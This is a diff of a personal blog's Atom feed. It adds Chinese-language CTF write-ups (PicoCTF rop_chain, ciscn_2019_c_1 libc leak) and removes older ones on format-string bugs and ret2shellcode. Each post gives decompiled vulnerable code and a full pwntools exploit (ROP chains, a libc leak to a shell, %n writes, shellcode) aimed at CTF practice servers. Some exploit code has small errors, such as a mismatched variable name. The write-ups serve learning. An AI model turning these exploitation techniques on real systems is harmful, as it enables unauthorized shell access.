@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cc-nianchu.github.io</id>
     <title>nianchu</title>
-    <updated>2021-09-22T13:50:36.093Z</updated>
+    <updated>2021-12-02T05:57:21.942Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://cc-nianchu.github.io"/>
     <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
@@ -10,6 +10,175 @@
     <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
     <icon>https://cc-nianchu.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, nianchu</rights>
+    <entry>
+        <title type="html"><![CDATA[不更新怕被删博客]]></title>
+        <id>https://cc-nianchu.github.io/post/bu-geng-xin-pa-bei-shan-bo-ke/</id>
+        <link href="https://cc-nianchu.github.io/post/bu-geng-xin-pa-bei-shan-bo-ke/">
+        </link>
+        <updated>2021-12-02T05:57:02.000Z</updated>
+        <content type="html"><![CDATA[<h1 id=""></h1>
+<p>最近特别少写题，就来buu按顺序一题一题刷下去吧<br>
+##buu PicoCTF_2018_rop_chain</p>
+<h3 id="-2"></h3>
+<p>一题简单的ROP，32位系统且开了Partial和NX保护</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+ int v4; // [esp+Ch] [ebp-Ch]
+
+ setvbuf(_bss_start, 0, 2, 0);
+ v4 = getegid();
+ setresgid(v4, v4, v4);
+ vuln();
+ return 0;
+}
+
+</code></pre>
+<pre><code>char *vuln()
+{
+ char s[24]; // [esp+0h] [ebp-18h] BYREF
+
+ printf(&quot;Enter your input&gt; &quot;);
+ return gets(s);
+}
+</code></pre>
+<p>一层一层走下去发现有gets()函数，看到这个函数基本上就可以判定是栈溢出，没有限制长度，看看有没有后门函数或者是Sys函数</p>
+<pre><code>int __cdecl flag(int a1)
+{
+  char s[48]; // [esp+Ch] [ebp-3Ch] BYREF
+  FILE *stream; // [esp+3Ch] [ebp-Ch]
+  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  if ( !stream )
+  {
+    puts(
+      &quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;);
+    exit(0);
+  }
+  fgets(s, 48, stream);
+  if ( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )
+    return printf(&quot;%s&quot;, s);
+  if ( win1 &amp;&amp; win2 )
+    return puts(&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;);
+  if ( win1 || win2 )
+    return puts(&quot;Nice Try! You're Getting There!&quot;);
+  return puts(&quot;You won't get the flag that easy..&quot;);
+}
+void win_function1()
+{
+  win1 = 1;
+}
+int __cdecl win_function2(int a1)
+{
+  int result; // eax
+  result = (unsigned __int8)win1;
+  if ( win1 &amp;&amp; a1 == -1163220307 )
+  {
+    win2 = 1;
+  }
+  else if ( win1 )
+  {
+    result = puts(&quot;Wrong Argument. Try Again.&quot;);
+  }
+  else
+  {
+    result = puts(&quot;Nope. Try a little bit harder.&quot;);
+  }
+  return result;
+}
+</code></pre>
+<p>发现只要在fun2中a1==-559039827且fun1中a1=-1163220307<br>
+exp:</p>
+<pre><code>from pwn import*
+
+q=remote('node4.buuoj.cn',29409)
+#q=process('./PicoCTF_2018_rop_chain')
+
+fun1=0x080485CB
+fun2=0x080485D8
+flag=0x0804862B
+
+payload='a'*0x1c
+payload+=p32(fun1)
+payload+=p32(fun2)
+payload+=p32(flag)+p32(0xBAAAAAAD)+p32(0XDEADBAAD)
+
+q.sendline(payload)
+q.interactive()
+</code></pre>
+<p>因为a1等于的是负数，所以得让他变成16进制的补码</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[基础泄漏libc  buu]]></title>
+        <id>https://cc-nianchu.github.io/post/ji-chu-xie-lou-libc-buu/</id>
+        <link href="https://cc-nianchu.github.io/post/ji-chu-xie-lou-libc-buu/">
+        </link>
+        <updated>2021-11-04T06:22:24.000Z</updated>
+        <content type="html"><![CDATA[<p>checksec得 64位系统+NX保护<br>
+<img src="https://cc-nianchu.github.io/post-images/1636007024609.png" alt="" loading="lazy"><br>
+main函数选择</p>
+<pre><code>int begin()
+{
+  puts(&quot;====================================================================&quot;);
+  puts(&quot;1.Encrypt&quot;);
+  puts(&quot;2.Decrypt&quot;);
+  puts(&quot;3.Exit&quot;);
+  return puts(&quot;Input your choice!&quot;);
+}
+</code></pre>
+<p>查看1函数<img src="https://cc-nianchu.github.io/post-images/1636007075011.png" alt="" loading="lazy"><br>
+发现这是一道加密题，无system函数也无binsh无libc，发现有gets()溢出点，发现可以利用的函数puts，很明显一道libc题<br>
+exp</p>
+<pre><code>from pwn import*
+from LibcSearcher import*
+
+q=remote('node4.buuoj.cn',25762)
+elf=ELF('./ciscn_2019_c_1')
+
+main_add=0x400B28
+ret_add=0x4006b9
+pop_rdi=0x400c83
+
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
+
+q.recvuntil(&quot;choice!\n&quot;)
+q.sendline('1')
+
+payload ='\0'+'a'*(0x50-1+8)                //绕过字符串判断
+payload +=p64(pop_rdi)
+payload +=p64(puts_got)
+payload +=p64(puts_plt)
+payload +=p64(main_add)
+
+q.recvuntil('encrypted\n')
+q.sendline(payload)
+
+q.recvline()
+q.recvline()
+
+puts_add=u64(q.recvuntil('\n')[:-1].ljust(8,'\0'))
+print hex(puts_addr)
+
+libc=LibcSearcher('puts',puts_addr)
+offset=puts_addr-libc.dump('puts')
+binsh=offset+libc.dump('str_bin_sh')
+system=offset+libc.dump('system')
+
+q.recvuntil('choice\n')
+q.sendline('1')
+
+payload ='\0'+'a'*(0x50-1+8)                //绕过字符串判断
+payload +=p64(ret_add)                      //ubuntu18 栈对齐
+payload +=p64(pop_rdi)
+payload +=p64(binsh)
+payload +=p64(system)
+
+q.recvuntil('encrypted\n')
+q.sendline(payload)
+q.interactive()
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[泄漏libc+栈迁移]]></title>
         <id>https://cc-nianchu.github.io/post/xie-lou-libczhan-qian-yi/</id>
@@ -1106,263 +1275,6 @@ r.sendline('1')
 r.sendline(payload)
 
 r.interactive()
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[格式字符串]]></title>
-        <id>https://cc-nianchu.github.io/post/ge-shi-zi-fu-chuan/</id>
-        <link href="https://cc-nianchu.github.io/post/ge-shi-zi-fu-chuan/">
-        </link>
-        <updated>2021-07-16T06:03:37.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="攻防世界新手题cgfsb">攻防世界新手题CGfsb</h2>
-<p>这道题是在攻防世界新手题 题目介绍为：菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用<br>
-拿到题目后我们先用最基础的checksec功能check一下</p>
-<pre><code>    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-</code></pre>
-<p>在这里我们发现程序是32位的  用IDA32位打开文件</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF
-  __int16 v5; // [esp+26h] [ebp-76h]
-  char s[100]; // [esp+28h] [ebp-74h] BYREF
-  unsigned int v7; // [esp+8Ch] [ebp-10h]
-
-  v7 = __readgsdword(0x14u);
-  setbuf(stdin, 0);
-  setbuf(stdout, 0);
-  setbuf(stderr, 0);
-  buf[0] = 0;
-  buf[1] = 0;
-  v5 = 0;
-  memset(s, 0, sizeof(s));
-  puts(&quot;please tell me your name:&quot;);
-  read(0, buf, 0xAu);
-  puts(&quot;leave your message please:&quot;);
-  fgets(s, 100, stdin);
-  printf(&quot;hello %s&quot;, (const char *)buf);
-  puts(&quot;your message is:&quot;);
-  printf(s);
-  if ( pwnme == 8 )
-  {
-    puts(&quot;you pwned me, here is your flag:\n&quot;);
-    system(&quot;cat flag&quot;);
-  }
-  else
-  {
-    puts(&quot;Thank you!&quot;);
-  }
-  return 0;
-}
-</code></pre>
-<p>根据新手提示 我们很快发现printf(s)；这句话有问题，平时我们学C语言，正确的应该是printf(&quot;%n&quot;,s);<br>
-printf（&quot;格式化字符串&quot;,参数...)</p>
-<pre><code class="language-格式化说明符有这些：">%d - 十进制 - 输出十进制整数
-%s - 字符串 - 从内存中读取字符串
-%x - 十六进制 - 输出十六进制数
-%c - 字符 - 输出字符
-%p - 指针 - 指针地址
-%n - 到目前为止所写的字符数
-</code></pre>
-<p>我们需要注意的是%n 这个格式化字符串，它的功能是将%n 之前打印出来的字符<br>
-个数，赋值给一个变量。看伪代码，我们发现让pwnme==8;这句话成立之后我们就可以运行cat flag 获得flag<br>
-因此我们需要：<br>
-1、我们需要将 pwnme 的地址输入到 s（也就是 message）中去<br>
-2、在合适的位置上加一个<code>%n</code>，使其与我们输入的地址对应从而造成漏洞利用<br>
-但我们需要知道输入进去的数据在栈中偏移了多少，知道偏移量后我们就可以利用pwnme。<br>
-运行程序:</p>
-<pre><code>please tell me your name:
-nianchu
-leave your message please:
-AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
-hello nianchu
-your message is:
-AAAA 0xffc1cc3e 0xf7f4b5c0 0xffc1cc8c 0xf7f91a9c 0x1 0xf7f64410 0x696e0001 0x68636e61 0xa75 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
-Thank you!
-</code></pre>
-<p>在这里我们数数AAAA对应的应该是0x41414141，我们发现0x41414141在第10个，偏移量便为10<br>
-需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们要用到第十个，所以是%10$n<br>
-所以EXP就有了</p>
-<pre><code>from pwn import*
-#q=precess(&quot;./CGfsb&quot;)
-q=remote('111.200.241.244',51786)
-
-pwnme_addr=0x0804A068
-payload=p32(pwnme_addr)+'ssbb'+'%10$n'
-q.recvuntil(&quot;please tell me your name:\n&quot;)
-q.sendline('nianchu')
-q.recvuntil(&quot;leave your message please:\n&quot;)
-q.sendline(payload)
-
-q.interactive()
-</code></pre>
-<h2 id="buu上的第五空间2019-决赛pwn5">buu上的[第五空间2019 决赛]PWN5</h2>
-<p>这是一道很明显格式化字符串不过应该还有其他的解法以后学了再来用其他的方法，主要是发现了/bin/sh<br>
-这道题我是用格式化字符串做的但是不是很熟练做了好久，又get到新知识。<br>
-首先checksec一下pwn5文件</p>
-<pre><code>Arch:     i386-32-little
-     RELRO:    Partial RELRO
-     Stack:    Canary found
-     NX:       NX enabled
-     PIE:      No PIE (0x8048000)
-</code></pre>
-<p>然后用ida32位打开pwn5文件 按F5打开伪代码</p>
-<pre><code>int __cdecl main(int a1)
-{
-  unsigned int v1; // eax
-  int result; // eax
-  int fd; // [esp+0h] [ebp-84h]
-  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
-  char buf[100]; // [esp+14h] [ebp-70h] BYREF
-  unsigned int v6; // [esp+78h] [ebp-Ch]
-  int *v7; // [esp+7Ch] [ebp-8h]
-
-  v7 = &amp;a1;
-  v6 = __readgsdword(0x14u);
-  setvbuf(stdout, 0, 2, 0);
-  v1 = time(0);
-  srand(v1);
-  fd = open(&quot;/dev/urandom&quot;, 0);
-  read(fd, &amp;dword_804C044, 4u);        //随机4位数
-  printf(&quot;your name:&quot;);
-  read(0, buf, 0x63u);
-  printf(&quot;Hello,&quot;);
-  printf(buf);
-  printf(&quot;your passwd:&quot;);
-  read(0, nptr, 0xFu);
-  if ( atoi(nptr) == dword_804C044 )
-  {
-     puts(&quot;ok!!&quot;);
-     system(&quot;/bin/sh&quot;);
-  }
-  else
-  {
-     puts(&quot;fail&quot;);
-  }
-  result = 0;
-  if ( __readgsdword(0x14u) != v6 )
-     sub_80493D0();
-  return result;
-}
-</code></pre>
-<p>能运行system(&quot;/bin/sh&quot;)很明显是要atoi(nptr)=dword_804C044，这是一道验证账号密码题目，密码在上面会随机4位数，但是我们利用格式化字符串将密码改成自己想要的就行了，%d读取数字，%x读取地址，%s读取任意地址的内容，%n任意地址写入。 例如aaaa%n=4,因为要写入4位数所以我们在0x804C044这个地址上得分4byte<br>
-<img src="https://cc-nianchu.github.io/post-images/1626489125752.png" alt="" loading="lazy"><br>
-这里配合上面讲的%10<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">样</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">道</mi><mi mathvariant="normal">理</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">n，一样的道理，%10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">道</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">，</span></span></span></span>n是一次占4个字节，因此我们分开。<br>
-首先我们得找到偏移量，打开程序输入AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</p>
-<pre><code>your name:AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
-Hello,AAAA 0xffe1b8d8 0x63 (nil) 0xf7f8da9c 0x3 0xf7f60410 0x1 (nil) 0x1 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
-��s��your passwd:
-</code></pre>
-<p>我们可以发现第十个就是偏移量，现在也找到偏移量也找到函数地址0x804c044，<br>
-而密码就是4 * len(p32()) = 0x10直接上EXP</p>
-<pre><code>from pwn import*
-#q=process(&quot;./pwn5&quot;)
-
-q=remote('node4.buuoj.cn',28993)
-
-addr=0x0804c044
-
-payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)
-
-payload+='%10$hhn%11$hhn%12$hhn%13$hhn'
-#payload+='%10$n%11$n%12$n%13$n'
-#q.recvuntil(&quot;your name:\n&quot;)
-q.sendline(payload)
-
-#q.recvuntil(&quot;your passwd:\n&quot;)
-payload=str(0x10101010)
-
-q.sendline(payload)
-
-q.interactive()
-</code></pre>
-<p>另外提醒一下  py文件不能起名为pwn.py，我也不懂为什么，反正起名了这个我搞了好久都是有错误上网找了好久都不行，后面发现改了个名字就能运行了。。。。。。。。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[shellcode 基础]]></title>
-        <id>https://cc-nianchu.github.io/post/shellcode-ji-chu/</id>
-        <link href="https://cc-nianchu.github.io/post/shellcode-ji-chu/">
-        </link>
-        <updated>2021-07-14T12:17:14.000Z</updated>
-        <summary type="html"><![CDATA[<p>shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。<br>
-ret2shellcode题型喝ret2text差不多，但ret2shellcode没有/bin/sh 后门直接利用的地址，因此我们需要自己构造shellcode。<br>
-shellcode（指令为:shellcode = asm(shellcraft.sh())）<br>
-题目ret2shellcode，做题前需要checksec一下有什么保护以及是多少位的程序</p>
-<pre><code>    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x8048000)
-    RWX:      Has RWX segments
-</code></pre>
-<p>在这里发现是32位程序而且开了NX保护打开IDA32按F5进入main函数伪代码</p>
-<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
-
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(stdin, 0, 1, 0);
-  puts(&quot;No system for you this time !!!&quot;);
-  gets(s);
-  strncpy(buf2, s, 0x64u);
-  printf(&quot;bye bye ~&quot;);
-  return 0;
-}
-</code></pre>
-<p>很明显跟ret2text一样 有gets（）函数和strncpy函数，gets函数是不限制输入内容，仅收到回车后结束，即有溢出                                  //gets（），直接读取一行，忽略'\x00'<br>
-我们先找buf2的地址作为shellcode 地址   在ida32很容易发现</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。<br>
-ret2shellcode题型喝ret2text差不多，但ret2shellcode没有/bin/sh 后门直接利用的地址，因此我们需要自己构造shellcode。<br>
-shellcode（指令为:shellcode = asm(shellcraft.sh())）<br>
-题目ret2shellcode，做题前需要checksec一下有什么保护以及是多少位的程序</p>
-<pre><code>    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x8048000)
-    RWX:      Has RWX segments
-</code></pre>
-<p>在这里发现是32位程序而且开了NX保护打开IDA32按F5进入main函数伪代码</p>
-<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
-
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(stdin, 0, 1, 0);
-  puts(&quot;No system for you this time !!!&quot;);
-  gets(s);
-  strncpy(buf2, s, 0x64u);
-  printf(&quot;bye bye ~&quot;);
-  return 0;
-}
-</code></pre>
-<p>很明显跟ret2text一样 有gets（）函数和strncpy函数，gets函数是不限制输入内容，仅收到回车后结束，即有溢出                                  //gets（），直接读取一行，忽略'\x00'<br>
-我们先找buf2的地址作为shellcode 地址   在ida32很容易发现</p>
-<!-- more -->
-<p>.bss:0804A080    buf2            db 64h dup(?)           ;</p>
-<!-- more -->
-<p>然后确定栈溢出覆盖返回地址的位置，可以手动计算，这里使用cyclic；<br>
-cyclic pattern是一个很好用的功能，pattern就是指一个字符串。在完成溢出题目时，使用cyclic pattern可以大大减少计算溢出点的时间。<br>
-<img src="https://cc-nianchu.github.io/post-images/1626265826546.png" alt="" loading="lazy"><br>
-可以发现在0x62616164中溢出<br>
-输入cyclic -l 0x0626164  可以得到偏移量为112<br>
-因此我们可以构造payload<br>
-payload=shellcode.ljust(112,'a')+p32（0x0804A080)<br>
-EXP如下</p>
-<pre><code>from pwn import *
-
-q = process('./ret2shellcode')
-shellcode = asm(shellcraft.sh())
-buf2_addr = 0x804a080
-
-qsendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
-q.interactive()
 </code></pre>
 ]]></content>
     </entry>
